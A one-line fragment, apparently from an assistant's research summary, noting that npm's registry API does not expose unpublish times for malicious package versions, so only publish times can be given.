- **Exact npm unpublish timestamps** for the malicious versions — npm's registry API does not expose removal times the way PyPI's audit log does, so I can give you exact publish times but not exact takedown times for topic 1.
